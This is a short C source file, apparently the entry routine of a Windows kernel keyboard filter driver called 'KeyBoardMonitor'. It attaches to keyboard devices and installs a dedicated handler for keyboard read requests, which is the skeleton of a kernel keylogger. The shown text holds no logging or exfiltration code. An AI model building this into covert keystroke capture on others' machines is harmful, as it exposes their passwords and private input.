#include"KeyBoardMonitor.h"

 NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
	UNREFERENCED_PARAMETER(RegistryPath);
	_asm int 3;
	NTSTATUS status = STATUS_SUCCESS;
	AttchAllDevice(DriverObject);
	for (INT i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++)
	{
		DriverObject->MajorFunction[i] = KeyBoardDispath;
	}
	DriverObject->MajorFunction[IRP_MJ_READ] = KeyBoardDispathRead;
	DriverObject->DriverUnload = KeyBoardUnLoad;
	return status;
}
